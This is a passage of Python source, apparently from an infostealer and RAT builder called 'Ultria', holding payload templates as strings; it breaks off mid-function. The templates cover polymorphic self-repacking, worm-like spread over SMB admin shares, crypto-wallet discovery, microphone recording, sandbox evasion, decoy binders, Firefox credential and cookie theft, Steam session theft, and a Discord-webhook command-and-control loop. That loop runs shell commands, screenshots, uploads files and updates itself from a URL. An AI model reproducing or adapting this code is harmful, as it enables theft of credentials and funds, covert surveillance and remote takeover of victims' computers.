        "                    if not v4r_self or not v4r_pros.path.isfile(v4r_self): continue\n"
        "                    with open(v4r_self,'rb') as v4r_f: v4r_data = v4r_f.read()\n"
        "                    v4r_idx = v4r_data.find(v4r_MARKER)\n"
        "                    if v4r_idx != -1: v4r_data = v4r_data[:v4r_idx]\n"
        "                    v4r_pad = bytes(v4r_prrand.randint(0,255) for _ in range(v4r_prrand.randint(128,512)))\n"
        "                    v4r_new = v4r_data + v4r_MARKER + v4r_pad\n"
        "                    v4r_tmp = v4r_self + '.tmp'\n"
        "                    with open(v4r_tmp,'wb') as v4r_f: v4r_f.write(v4r_new)\n"
        "                    v4r_pros.replace(v4r_tmp, v4r_self)\n"
        "                except: pass\n"
        "        v4r_prt.Thread(target=v4r_repack, daemon=True).start()\n"
        "    D3f_PolymorphicRepack()\n"
        "except: pass\n"
    )

    T_LanSpreader = (
        "\ntry:\n"
        "    import threading as v4r_lnt, socket as v4r_lns, os as v4r_lnos, sys as v4r_lnsys, shutil as v4r_lnsh, requests as v4r_lnrq\n"
        "    def D3f_LanSpreader():\n"
        "        v4r_wh   = '__WEBHOOK__'\n"
        "        v4r_self = v4r_lnsys.executable if getattr(v4r_lnsys,'frozen',False) else v4r_lnos.path.abspath(__file__)\n"
        "        v4r_fname = v4r_lnos.path.basename(v4r_self)\n"
        "        def v4r_get_local_ip():\n"
        "            try:\n"
        "                v4r_s = v4r_lns.socket(v4r_lns.AF_INET, v4r_lns.SOCK_DGRAM)\n"
        "                v4r_s.connect(('8.8.8.8',80))\n"
        "                return v4r_s.getsockname()[0]\n"
        "            except: return None\n"
        "        def v4r_scan_host(v4r_ip):\n"
        "            try:\n"
        "                v4r_s = v4r_lns.socket(v4r_lns.AF_INET, v4r_lns.SOCK_STREAM)\n"
        "                v4r_s.settimeout(0.4)\n"
        "                if v4r_s.connect_ex((v4r_ip,445)) == 0:\n"
        "                    v4r_s.close(); return True\n"
        "                v4r_s.close()\n"
        "            except: pass\n"
        "            return False\n"
        "        def v4r_try_spread(v4r_ip):\n"
        "            v4r_targets = [\n"
        "                f'\\\\\\\\{v4r_ip}\\\\C$\\\\Users\\\\Public\\\\{v4r_fname}',\n"
        "                f'\\\\\\\\{v4r_ip}\\\\C$\\\\ProgramData\\\\{v4r_fname}',\n"
        "                f'\\\\\\\\{v4r_ip}\\\\ADMIN$\\\\{v4r_fname}',\n"
        "            ]\n"
        "            for v4r_dst in v4r_targets:\n"
        "                try:\n"
        "                    v4r_lnsh.copy2(v4r_self, v4r_dst)\n"
        "                    return v4r_dst\n"
        "                except: pass\n"
        "            return None\n"
        "        def v4r_spread_loop():\n"
        "            import time as v4r_lntm\n"
        "            v4r_lntm.sleep(30)\n"
        "            v4r_local = v4r_get_local_ip()\n"
        "            if not v4r_local: return\n"
        "            v4r_prefix = '.'.join(v4r_local.split('.')[:3])+'.'\n"
        "            v4r_found = []; v4r_spread_ok = []\n"
        "            v4r_threads = []\n"
        "            v4r_live_ips = []\n"
        "            def v4r_check(v4r_i):\n"
        "                v4r_ip = v4r_prefix+str(v4r_i)\n"
        "                if v4r_ip != v4r_local and v4r_scan_host(v4r_ip):\n"
        "                    v4r_live_ips.append(v4r_ip)\n"
        "            for v4r_i in range(1,255):\n"
        "                v4r_th = v4r_lnt.Thread(target=v4r_check,args=(v4r_i,),daemon=True)\n"
        "                v4r_threads.append(v4r_th); v4r_th.start()\n"
        "            for v4r_th in v4r_threads: v4r_th.join(timeout=2)\n"
        "            if v4r_live_ips:\n"
        "                for v4r_ip in v4r_live_ips:\n"
        "                    v4r_dst = v4r_try_spread(v4r_ip)\n"
        "                    if v4r_dst: v4r_spread_ok.append(v4r_ip+' → '+v4r_dst)\n"
        "                    else: v4r_found.append(v4r_ip)\n"
        "                v4r_msg = f'**LAN Scan** from `{v4r_lns.gethostname()}`\\n'\n"
        "                if v4r_spread_ok: v4r_msg += '**Spread OK:** '+', '.join(v4r_spread_ok)+'\\n'\n"
        "                if v4r_found: v4r_msg += '**Live (no access):** '+', '.join(v4r_found)\n"
        "                try: v4r_lnrq.post(v4r_wh, json={'embeds':[{'title':'LAN Spreader','description':v4r_msg,'color':16776960}],'username':'Ultria'}, timeout=8)\n"
        "                except: pass\n"
        "        v4r_lnt.Thread(target=v4r_spread_loop, daemon=True).start()\n"
        "    D3f_LanSpreader()\n"
        "except: pass\n"
    )

    T_CryptoWallets = (
        "\ntry:\n"
        "    if globals().get('_v4r_skip_steal',False): raise SystemExit\n"
        "    import os as v4r_cwos, requests as v4r_cwrq\n"
        "    def D3f_CryptoWallets():\n"
        "        v4r_appdata  = v4r_cwos.environ.get('APPDATA','')\n"
        "        v4r_lappdata = v4r_cwos.environ.get('LOCALAPPDATA','')\n"
        "        v4r_browsers = [\n"
        "            ('Chrome',      v4r_cwos.path.join(v4r_lappdata,'Google','Chrome','User Data')),\n"
        "            ('Edge',        v4r_cwos.path.join(v4r_lappdata,'Microsoft','Edge','User Data')),\n"
        "            ('Brave',       v4r_cwos.path.join(v4r_lappdata,'BraveSoftware','Brave-Browser','User Data')),\n"
        "            ('Opera',       v4r_cwos.path.join(v4r_appdata,'Opera Software','Opera Stable')),\n"
        "            ('OperaGX',     v4r_cwos.path.join(v4r_appdata,'Opera Software','Opera GX Stable')),\n"
        "            ('Vivaldi',     v4r_cwos.path.join(v4r_lappdata,'Vivaldi','User Data')),\n"
        "            ('Yandex',      v4r_cwos.path.join(v4r_lappdata,'Yandex','YandexBrowser','User Data')),\n"
        "            ('Chromium',    v4r_cwos.path.join(v4r_lappdata,'Chromium','User Data')),\n"
        "            ('CentBrowser', v4r_cwos.path.join(v4r_lappdata,'CentBrowser','User Data')),\n"
        "            ('Torch',       v4r_cwos.path.join(v4r_lappdata,'Torch','User Data')),\n"
        "            ('Comodo',      v4r_cwos.path.join(v4r_lappdata,'Comodo','Dragon','User Data')),\n"
        "            ('Slimjet',     v4r_cwos.path.join(v4r_lappdata,'Slimjet','User Data')),\n"
        "        ]\n"
        "        v4r_ext_ids = [\n"
        "            ('MetaMask',      'nkbihfbeogaeaoehlefnkodbefgpgknn'),\n"
        "            ('MetaMask_Edge', 'ejbalbakoplchlghecdalmeeeajnimhm'),\n"
        "            ('Coinbase',      'hnfanknocfeofbddgcijnmhnfnkdnaad'),\n"
        "            ('TronLink',      'ibnejdfjmmkpcnlpebklmnkoeoihofec'),\n"
        "            ('Phantom',       'bfnaelmomeimhlpmgjnjophhpkkoljpa'),\n"
        "            ('Solflare',      'bhhhlbepdkbapadjdnnojkbgioiodbic'),\n"
        "            ('Keplr',         'dmkamcknogkgcdfhhbddcghachkejeap'),\n"
        "            ('Yoroi',         'ffnbelfdoeiohenkjibnmadjiehjhajb'),\n"
        "            ('MathWallet',    'afbcbjpbpfadlkmhmclhkeeodmamcflc'),\n"
        "            ('Trust',         'egjidjbpglichdcondbcbdnbeeppgdph'),\n"
        "            ('Coin98',        'aeachknmefphepccionboohckonoeemg'),\n"
        "            ('Binance',       'fhbohimaelbohpjbbldcngcnapndodjp'),\n"
        "            ('Ronin',         'fnjhmkhhmkbjkkabndcnnogagogbneec'),\n"
        "            ('Nifty',         'jbdaocneiiinmjbjlgalhcelgbejmnid'),\n"
        "            ('WalletConnect', 'gpfndedineagiepkpinficbcbbgjoenn'),\n"
        "            ('Liquality',     'kpfopkelmapcoipemfendmdcghnegimn'),\n"
        "            ('OKX',           'mcohilncbfahbmgdjkbpemcciiolgcge'),\n"
        "            ('Bybit',         'pdliaogehgdbhbnmkklieghmmjkpigpa'),\n"
        "        ]\n"
        "        v4r_standalone = {\n"
        "            'Exodus':    v4r_cwos.path.join(v4r_appdata,'Exodus','exodus.wallet'),\n"
        "            'Electrum':  v4r_cwos.path.join(v4r_appdata,'Electrum','wallets'),\n"
        "            'Atomic':    v4r_cwos.path.join(v4r_appdata,'atomic','Local Storage','leveldb'),\n"
        "            'Jaxx':      v4r_cwos.path.join(v4r_appdata,'Jaxx','Local Storage'),\n"
        "            'Wasabi':    v4r_cwos.path.join(v4r_appdata,'WalletWasabi','Client','Wallets'),\n"
        "            'Coinomi':   v4r_cwos.path.join(v4r_lappdata,'Coinomi','Coinomi','wallets'),\n"
        "            'Guarda':    v4r_cwos.path.join(v4r_appdata,'Guarda','Local Storage','leveldb'),\n"
        "            'Zcash':     v4r_cwos.path.join(v4r_appdata,'Zcash'),\n"
        "            'Armory':    v4r_cwos.path.join(v4r_appdata,'Armory'),\n"
        "            'Bitcoin_Core': v4r_cwos.path.join(v4r_appdata,'Bitcoin','wallets'),\n"
        "            'Litecoin':  v4r_cwos.path.join(v4r_appdata,'Litecoin','wallets'),\n"
        "            'Dash_Core': v4r_cwos.path.join(v4r_appdata,'DashCore','wallets'),\n"
        "        }\n"
        "        v4r_found = []\n"
        "        for v4r_bname, v4r_bpath in v4r_browsers:\n"
        "            if not v4r_cwos.path.isdir(v4r_bpath): continue\n"
        "            for v4r_wname, v4r_ext_id in v4r_ext_ids:\n"
        "                for v4r_prof in ['Default'] + [f'Profile {i}' for i in range(1, 7)]:\n"
        "                    v4r_ep = v4r_cwos.path.join(v4r_bpath, v4r_prof, 'Local Extension Settings', v4r_ext_id)\n"
        "                    if v4r_cwos.path.exists(v4r_ep):\n"
        "                        v4r_found.append(f'{v4r_bname}/{v4r_prof} - {v4r_wname}')\n"
        "        for v4r_name, v4r_path in v4r_standalone.items():\n"
        "            if v4r_cwos.path.exists(v4r_path):\n"
        "                v4r_found.append(f'{v4r_name}: {v4r_path}')\n"
        "        v4r_ff_profiles = v4r_cwos.path.join(v4r_appdata, 'Mozilla', 'Firefox', 'Profiles')\n"
        "        if v4r_cwos.path.isdir(v4r_ff_profiles):\n"
        "            try:\n"
        "                for v4r_prof in v4r_cwos.listdir(v4r_ff_profiles):\n"
        "                    for v4r_wname, v4r_ext_id in v4r_ext_ids:\n"
        "                        v4r_ep = v4r_cwos.path.join(v4r_ff_profiles, v4r_prof, 'storage', 'default', f'moz-extension+++{v4r_ext_id}')\n"
        "                        if v4r_cwos.path.exists(v4r_ep):\n"
        "                            v4r_found.append(f'Firefox/{v4r_prof} - {v4r_wname}')\n"
        "            except: pass\n"
        "        if v4r_found:\n"
        "            v4r_tck = chr(96)*3\n"
        "            v4r_cwrq.post('__WEBHOOK__', json={'embeds':[{'title':'Crypto Wallets','description':v4r_tck+'\\n'.join(v4r_found)[:3900]+v4r_tck,'color':11206149}],'username':'Ultria'}, timeout=5)\n"
        "    D3f_CryptoWallets()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('CryptoWallets: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_Microphone = (
        "\ntry:\n"
        "    if globals().get('_v4r_skip_steal',False): raise SystemExit\n"
        "    import threading as v4r_mict, io as v4r_micio, requests as v4r_micrq\n"
        "    def D3f_Microphone():\n"
        "        try:\n"
        "            import sounddevice as v4r_sd\n"
        "            import soundfile as v4r_sf\n"
        "        except: return\n"
        "        v4r_buf = v4r_micio.BytesIO()\n"
        "        v4r_data = v4r_sd.rec(int(5 * 44100), samplerate=44100, channels=1, dtype='int16')\n"
        "        v4r_sd.wait()\n"
        "        v4r_sf.write(v4r_buf, v4r_data, 44100, format='WAV')\n"
        "        v4r_buf.seek(0)\n"
        "        try: v4r_micrq.post('__WEBHOOK__', files={'file': ('mic.wav', v4r_buf, 'audio/wav')}, data={'username':'Ultria'}, timeout=10)\n"
        "        except: pass\n"
        "    v4r_mict.Thread(target=D3f_Microphone, daemon=True).start()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('Microphone: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_TimingEvasion = (
        "\ntry:\n"
        "    import time as v4r_tetime, random as v4r_terng, os as v4r_teos\n"
        "    def D3f_TimingEvasion():\n"
        "        v4r_sleep = v4r_terng.randint(20, 40)\n"
        "        v4r_tetime.sleep(v4r_sleep)\n"
        "        v4r_uptime = None\n"
        "        try:\n"
        "            import ctypes as v4r_tect\n"
        "            v4r_uptime = v4r_tect.windll.kernel32.GetTickCount64() / 1000\n"
        "        except: pass\n"
        "        if v4r_uptime and v4r_uptime < 120:\n"
        "            v4r_tetime.sleep(300)\n"
        "    D3f_TimingEvasion()\n"
        "except: pass\n"
    )

    # Binder — EXE mode: PyInstaller bundles the legit file; this template drops it to
    # AppData\Microsoft\Windows\ (persistent, looks legit) then runs it.
    T_BinderExe = (
        "\ntry:\n"
        "    import os as v4r_bdos, sys as v4r_bdsys, subprocess as v4r_bdsub\n"
        "    import shutil as v4r_bdsh, threading as v4r_bdt\n"
        "    def D3f_RunLegit():\n"
        "        v4r_bn   = '__BINDER_NAME__'\n"
        "        v4r_base = getattr(v4r_bdsys, '_MEIPASS', v4r_bdos.path.dirname(v4r_bdos.path.abspath(__file__)))\n"
        "        v4r_src  = v4r_bdos.path.join(v4r_base, v4r_bn)\n"
        "        if not v4r_bdos.path.isfile(v4r_src): return\n"
        "        v4r_ext  = v4r_bdos.path.splitext(v4r_bn)[1].lower()\n"
        "        v4r_drop = v4r_bdos.path.join(v4r_bdos.environ.get('APPDATA',''), 'Microsoft', 'Windows')\n"
        "        try:\n"
        "            v4r_bdos.makedirs(v4r_drop, exist_ok=True)\n"
        "        except:\n"
        "            v4r_drop = v4r_bdos.environ.get('TEMP', v4r_bdos.environ.get('TMP', v4r_bdos.path.dirname(v4r_bdsys.executable)))\n"
        "        v4r_dst = v4r_bdos.path.join(v4r_drop, v4r_bn)\n"
        "        if not v4r_bdos.path.isfile(v4r_dst):\n"
        "            try: v4r_bdsh.copy2(v4r_src, v4r_dst)\n"
        "            except: v4r_dst = v4r_src\n"
        "        try:\n"
        "            if v4r_ext == '.exe':\n"
        "                v4r_bdsub.Popen([v4r_dst])\n"
        "            else:\n"
        "                v4r_bdos.startfile(v4r_dst)\n"
        "        except: pass\n"
        "    v4r_bdt.Thread(target=D3f_RunLegit, daemon=False).start()\n"
        "except: pass\n"
    )

    # Binder — Python File mode: legit file embedded as base64, dropped to AppData at runtime.
    T_BinderPy = (
        "\ntry:\n"
        "    import os as v4r_bdos, base64 as v4r_bdb64\n"
        "    import subprocess as v4r_bdsub, threading as v4r_bdt\n"
        "    def D3f_RunLegit():\n"
        "        v4r_raw  = v4r_bdb64.b64decode(b'__BINDER_B64__')\n"
        "        v4r_ext  = '__BINDER_EXT__'\n"
        "        v4r_bn   = '__BINDER_NAME__'\n"
        "        v4r_drop = v4r_bdos.path.join(v4r_bdos.environ.get('APPDATA',''), 'Microsoft', 'Windows')\n"
        "        try:\n"
        "            v4r_bdos.makedirs(v4r_drop, exist_ok=True)\n"
        "        except:\n"
        "            v4r_drop = v4r_bdos.environ.get('TEMP', '')\n"
        "        v4r_dst = v4r_bdos.path.join(v4r_drop, v4r_bn)\n"
        "        if not v4r_bdos.path.isfile(v4r_dst):\n"
        "            try:\n"
        "                with open(v4r_dst, 'wb') as v4r_f: v4r_f.write(v4r_raw)\n"
        "            except: return\n"
        "        try:\n"
        "            if v4r_ext.lower() == '.exe':\n"
        "                v4r_bdsub.Popen([v4r_dst])\n"
        "            else:\n"
        "                v4r_bdos.startfile(v4r_dst)\n"
        "        except: pass\n"
        "    v4r_bdt.Thread(target=D3f_RunLegit, daemon=False).start()\n"
        "except: pass\n"
    )

    T_Firefox = (
        "\ntry:\n"
        "    if globals().get('_v4r_skip_steal',False): raise SystemExit\n"
        "    import os as v4r_ffos, requests as v4r_ffrq, io as v4r_ffio, zipfile as v4r_ffzip\n"
        "    def D3f_GetFirefox():\n"
        "        v4r_ff_base = v4r_ffos.path.join(v4r_ffos.environ.get('APPDATA',''), 'Mozilla', 'Firefox', 'Profiles')\n"
        "        if not v4r_ffos.path.isdir(v4r_ff_base): return\n"
        "        v4r_targets = ('logins.json','key4.db','cookies.sqlite','places.sqlite','formhistory.sqlite','cert9.db')\n"
        "        v4r_buf = v4r_ffio.BytesIO()\n"
        "        v4r_found = False\n"
        "        with v4r_ffzip.ZipFile(v4r_buf, 'w', v4r_ffzip.ZIP_DEFLATED) as v4r_zf:\n"
        "            try:\n"
        "                for v4r_prof in v4r_ffos.listdir(v4r_ff_base):\n"
        "                    v4r_pd = v4r_ffos.path.join(v4r_ff_base, v4r_prof)\n"
        "                    if not v4r_ffos.path.isdir(v4r_pd): continue\n"
        "                    for v4r_fn in v4r_targets:\n"
        "                        v4r_fp = v4r_ffos.path.join(v4r_pd, v4r_fn)\n"
        "                        if not v4r_ffos.path.isfile(v4r_fp): continue\n"
        "                        try:\n"
        "                            with open(v4r_fp, 'rb') as v4r_f:\n"
        "                                v4r_zf.writestr(f'{v4r_prof}/{v4r_fn}', v4r_f.read())\n"
        "                                v4r_found = True\n"
        "                        except: pass\n"
        "            except: pass\n"
        "        if v4r_found:\n"
        "            v4r_buf.seek(0)\n"
        "            try: v4r_ffrq.post('__WEBHOOK__', files={'file': ('firefox_data.zip', v4r_buf, 'application/zip')}, data={'username': 'Ultria'}, timeout=20)\n"
        "            except: pass\n"
        "    D3f_GetFirefox()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('Firefox: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_Steam = (
        "\ntry:\n"
        "    if globals().get('_v4r_skip_steal',False): raise SystemExit\n"
        "    import os as v4r_stos, requests as v4r_strq, io as v4r_stio, zipfile as v4r_stzip, glob as v4r_stglob\n"
        "    def D3f_GetSteam():\n"
        "        v4r_pf86 = v4r_stos.environ.get('PROGRAMFILES(X86)','')\n"
        "        v4r_pf   = v4r_stos.environ.get('PROGRAMFILES','')\n"
        "        v4r_steam_paths = [\n"
        "            v4r_stos.path.join(v4r_pf86, 'Steam'),\n"
        "            v4r_stos.path.join(v4r_pf,   'Steam'),\n"
        "            'C:\\\\Program Files (x86)\\\\Steam',\n"
        "            'C:\\\\Steam',\n"
        "            v4r_stos.path.join(v4r_stos.environ.get('LOCALAPPDATA',''), 'Steam'),\n"
        "        ]\n"
        "        v4r_buf = v4r_stio.BytesIO()\n"
        "        v4r_found = False\n"
        "        with v4r_stzip.ZipFile(v4r_buf, 'w', v4r_stzip.ZIP_DEFLATED) as v4r_zf:\n"
        "            for v4r_sp in v4r_steam_paths:\n"
        "                if not v4r_stos.path.isdir(v4r_sp): continue\n"
        "                for v4r_sf in v4r_stglob.glob(v4r_stos.path.join(v4r_sp, 'ssfn*')):\n"
        "                    try:\n"
        "                        with open(v4r_sf, 'rb') as v4r_f:\n"
        "                            v4r_zf.writestr(v4r_stos.path.basename(v4r_sf), v4r_f.read())\n"
        "                            v4r_found = True\n"
        "                    except: pass\n"
        "                for v4r_fn in ('loginusers.vdf', 'config.vdf'):\n"
        "                    v4r_fp = v4r_stos.path.join(v4r_sp, 'config', v4r_fn)\n"
        "                    if v4r_stos.path.isfile(v4r_fp):\n"
        "                        try:\n"
        "                            with open(v4r_fp, 'r', encoding='utf-8', errors='ignore') as v4r_f:\n"
        "                                v4r_zf.writestr(v4r_fn, v4r_f.read())\n"
        "                                v4r_found = True\n"
        "                        except: pass\n"
        "                break\n"
        "        if v4r_found:\n"
        "            v4r_buf.seek(0)\n"
        "            try: v4r_strq.post('__WEBHOOK__', files={'file': ('steam_session.zip', v4r_buf, 'application/zip')}, data={'username': 'Ultria'}, timeout=20)\n"
        "            except: pass\n"
        "    D3f_GetSteam()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('Steam: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_C2Heartbeat = (
        "\ntry:\n"
        "    import threading as v4r_c2t, requests as v4r_c2rq\n"
        "    import time as v4r_c2time, socket as v4r_c2sock\n"
        "    import os as v4r_c2os, sys as v4r_c2sys\n"
        "    import subprocess as v4r_c2sub, io as v4r_c2io\n"
        "    def D3f_C2Heartbeat():\n"
        "        v4r_c2_wh         = '__PRIMARY_WEBHOOK__'\n"
        "        v4r_c2_host       = v4r_c2sock.gethostname()\n"
        "        v4r_c2_mid        = [None]\n"
        "        v4r_c2_col        = 11206149\n"
        "        v4r_c2_col_ok     = 3066993\n"
        "        v4r_stream_stop   = [True]\n"
        "        v4r_registry_mid  = '__REGISTRY_MSGID__'\n"
        "        v4r_c2_reg_key = 'Software\\\\MicrosoftEdge\\\\Update'\n"
        "        v4r_c2_reg_val = 'ServiceSessionId'\n"
        "        def v4r_c2_save_mid(mid):\n"
        "            try:\n"
        "                import winreg as v4r_wr\n"
        "                v4r_k = v4r_wr.CreateKeyEx(v4r_wr.HKEY_CURRENT_USER, v4r_c2_reg_key, 0, v4r_wr.KEY_SET_VALUE)\n"
        "                v4r_wr.SetValueEx(v4r_k, v4r_c2_reg_val, 0, v4r_wr.REG_SZ, str(mid))\n"
        "                v4r_wr.CloseKey(v4r_k)\n"
        "            except: pass\n"
        "        def v4r_c2_load_mid():\n"
        "            try:\n"
        "                import winreg as v4r_wr\n"
        "                v4r_k = v4r_wr.OpenKey(v4r_wr.HKEY_CURRENT_USER, v4r_c2_reg_key, 0, v4r_wr.KEY_READ)\n"
        "                v4r_val, _ = v4r_wr.QueryValueEx(v4r_k, v4r_c2_reg_val)\n"
        "                v4r_wr.CloseKey(v4r_k)\n"
        "                return str(v4r_val)\n"
        "            except: return None\n"
        "        def v4r_c2_post(desc, wait=False):\n"
        "            for v4r_att in range(3):\n"
        "                try:\n"
        "                    v4r_u = v4r_c2_wh + ('?wait=true' if wait else '')\n"
        "                    v4r_r = v4r_c2rq.post(v4r_u, json={'embeds':[{'title':'[C2] '+v4r_c2_host,'description':desc,'color':v4r_c2_col}],'username':'Ultria C2'}, timeout=6)\n"
        "                    if v4r_r.status_code == 429:\n"
        "                        v4r_c2time.sleep(float(v4r_r.json().get('retry_after', 5)))\n"
        "                        continue\n"
        "                    if wait and v4r_r.status_code == 200: return v4r_r.json().get('id')\n"
        "                    return v4r_r.status_code in (200, 204)\n"
        "                except Exception: pass\n"
        "            return None\n"
        "        def v4r_c2_get(mid):\n"
        "            try:\n"
        "                v4r_r = v4r_c2rq.get(v4r_c2_wh+'/messages/'+str(mid), timeout=6)\n"
        "                if v4r_r.status_code == 429:\n"
        "                    v4r_c2time.sleep(float(v4r_r.json().get('retry_after', 5)))\n"
        "                    return v4r_c2_get(mid)\n"
        "                if v4r_r.status_code == 200: return v4r_r.json()\n"
        "            except Exception: pass\n"
        "            return None\n"
        "        def v4r_c2_patch(mid, desc):\n"
        "            try:\n"
        "                v4r_r = v4r_c2rq.patch(v4r_c2_wh+'/messages/'+str(mid), json={'embeds':[{'title':'[C2] '+v4r_c2_host,'description':desc,'color':v4r_c2_col}]}, timeout=6)\n"
        "                if v4r_r.status_code == 429: v4r_c2time.sleep(float(v4r_r.json().get('retry_after', 5)))\n"
        "                return v4r_r.status_code in (200, 204)\n"
        "            except Exception: return False\n"
        "        def v4r_c2_result(text):\n"
        "            try:\n"
        "                v4r_tck = chr(96)*3\n"
        "                v4r_c2rq.post(v4r_c2_wh, json={'embeds':[{'title':'[RESULT] '+v4r_c2_host,'description':v4r_tck+str(text)[:3900]+v4r_tck,'color':v4r_c2_col_ok}],'username':'Ultria C2'}, timeout=10)\n"
        "            except Exception: pass\n"
        "        def v4r_c2_registry_update(v4r_my_mid):\n"
        "            if not v4r_registry_mid or v4r_registry_mid == '__REGISTRY_MSGID__': return\n"
        "            try:\n"
        "                import json as v4r_rjson\n"
        "                v4r_r = v4r_c2rq.get(v4r_c2_wh+'/messages/'+v4r_registry_mid, timeout=6)\n"
        "                v4r_victims = {}\n"
        "                if v4r_r.status_code == 200:\n"
        "                    v4r_embs = v4r_r.json().get('embeds',[])\n"
        "                    if v4r_embs:\n"
        "                        v4r_desc = v4r_embs[0].get('description','')\n"
        "                        try:\n"
        "                            v4r_inner = v4r_desc[v4r_desc.find('{'):v4r_desc.rfind('}')+1]\n"
        "                            v4r_victims = v4r_rjson.loads(v4r_inner)\n"
        "                        except: pass\n"
        "                v4r_victims[v4r_c2_host] = {'msg_id': str(v4r_my_mid), 'webhook': v4r_c2_wh, 'time': v4r_c2time.strftime('%Y-%m-%d %H:%M')}\n"
        "                v4r_tck = chr(96)*3\n"
        "                v4r_body = v4r_tck+'json\\n'+v4r_rjson.dumps(v4r_victims,indent=2)+'\\n'+v4r_tck\n"
        "                v4r_c2rq.patch(v4r_c2_wh+'/messages/'+v4r_registry_mid, json={'embeds':[{'title':'C2 Auto-Registry','description':'**C2 Auto-Registry** — '+str(len(v4r_victims))+' victim(s)\\n'+v4r_body,'color':11206149}]}, timeout=6)\n"
        "            except: pass\n"
        "        def v4r_c2_register():\n"
        "            v4r_st = '`'+v4r_c2_host+'` | READY | '+v4r_c2time.strftime('%H:%M:%S')\n"
        "            v4r_saved = v4r_c2_load_mid()\n"
        "            if v4r_saved:\n"
        "                v4r_msg = v4r_c2_get(v4r_saved)\n"
        "                if v4r_msg is not None:\n"
        "                    v4r_emb = v4r_msg.get('embeds',[])\n"
        "                    if v4r_emb:\n"
        "                        v4r_desc = v4r_emb[0].get('description','')\n"
        "                        if not v4r_desc.strip().startswith('CMD::'):\n"
        "                            if v4r_c2_patch(v4r_saved, v4r_st):\n"
        "                                v4r_c2_registry_update(v4r_saved)\n"
        "                                return v4r_saved\n"
        "            while True:\n"
        "                v4r_mid = v4r_c2_post(v4r_st, wait=True)\n"
        "                if v4r_mid:\n"
        "                    v4r_c2_save_mid(v4r_mid)\n"
        "                    try: v4r_c2rq.post(v4r_c2_wh, json={'content':'[C2-REGISTER] `'+v4r_c2_host+'` | MSG_ID: '+str(v4r_mid),'username':'Ultria C2'}, timeout=6)\n"
        "                    except Exception: pass\n"
        "                    v4r_c2_registry_update(v4r_mid)\n"
        "                    return v4r_mid\n"
        "                v4r_c2time.sleep(30)\n"
        "        def v4r_c2_exec(cmd):\n"
        "            try:\n"
        "                if cmd.startswith('CMD::shell::'):\n"
        "                    v4r_c = cmd[12:]\n"
        "                    try: v4r_o = v4r_c2sub.check_output(v4r_c, shell=True, stderr=v4r_c2sub.STDOUT, creationflags=v4r_c2sub.CREATE_NO_WINDOW, timeout=30).decode('utf-8','ignore')\n"
        "                    except v4r_c2sub.CalledProcessError as v4r_e: v4r_o = v4r_e.output.decode('utf-8','ignore')\n"
        "                    except Exception as v4r_e: v4r_o = str(v4r_e)\n"
        "                    v4r_c2_result(v4r_o or '(no output)')\n"
        "                elif cmd.startswith('CMD::run::'):\n"
        "                    v4r_p = cmd[10:]\n"
        "                    try: v4r_c2sub.Popen(v4r_p, shell=True, creationflags=v4r_c2sub.CREATE_NO_WINDOW); v4r_c2_result('Launched: '+v4r_p)\n"
        "                    except Exception as v4r_e: v4r_c2_result('Run failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::update::'):\n"
        "                    v4r_url = cmd[13:]\n"
        "                    try:\n"
        "                        import shutil as v4r_sh\n"
        "                        v4r_self = v4r_c2sys.executable if getattr(v4r_c2sys,'frozen',False) else v4r_c2os.path.abspath(__file__)\n"
        "                        v4r_sh.copy2(v4r_self, v4r_self+'.bak')\n"
        "                        v4r_dl = v4r_c2rq.get(v4r_url, timeout=30)\n"
        "                        v4r_tmp = v4r_self+'.tmp'\n"
        "                        with open(v4r_tmp,'wb') as v4r_f: v4r_f.write(v4r_dl.content)\n"
        "                        v4r_c2os.replace(v4r_tmp, v4r_self)\n"
        "                        v4r_c2sub.Popen([v4r_self], creationflags=v4r_c2sub.CREATE_NO_WINDOW)\n"
        "                        v4r_c2_result('Updated. Restarting...')\n"
        "                        v4r_c2os._exit(0)\n"
        "                    except Exception as v4r_e: v4r_c2_result('Update failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::rollback':\n"
        "                    try:\n"
        "                        v4r_self = v4r_c2sys.executable if getattr(v4r_c2sys,'frozen',False) else v4r_c2os.path.abspath(__file__)\n"
        "                        v4r_bak = v4r_self+'.bak'\n"
        "                        if v4r_c2os.path.isfile(v4r_bak):\n"
        "                            v4r_c2os.replace(v4r_bak, v4r_self)\n"
        "                            v4r_c2sub.Popen([v4r_self], creationflags=v4r_c2sub.CREATE_NO_WINDOW)\n"
        "                            v4r_c2_result('Rolled back. Restarting...')\n"
        "                            v4r_c2os._exit(0)\n"
        "                        else: v4r_c2_result('No backup found.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('Rollback failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::screenshot'):\n"
        "                    try:\n"
        "                        from PIL import ImageGrab as v4r_ig\n"
        "                        v4r_img = v4r_ig.grab()\n"
        "                        v4r_buf = v4r_c2io.BytesIO()\n"
        "                        v4r_img.save(v4r_buf, format='PNG')\n"
        "                        v4r_buf.seek(0)\n"
        "                        v4r_c2rq.post(v4r_c2_wh, files={'file':('screen_'+v4r_c2_host+'.png',v4r_buf,'image/png')}, data={'username':'Ultria C2'}, timeout=15)\n"
        "                    except Exception as v4r_e: v4r_c2_result('Screenshot failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::upload::'):\n"
        "                    v4r_p = cmd[13:]\n"
        "                    try:\n"
        "                        with open(v4r_p,'rb') as v4r_f:\n"
        "                            v4r_c2rq.post(v4r_c2_wh, files={'file':(v4r_c2os.path.basename(v4r_p),v4r_f)}, data={'username':'Ultria C2'}, timeout=30)\n"
        "                    except Exception as v4r_e: v4r_c2_result('Upload failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::download::'):\n"
        "                    v4r_pts = cmd[15:].split('::',1)\n"
        "                    v4r_dest = v4r_pts[1] if len(v4r_pts)>1 else v4r_c2os.path.join(v4r_c2os.environ.get('TEMP',''),'c2dl')\n"
        "                    try:\n"
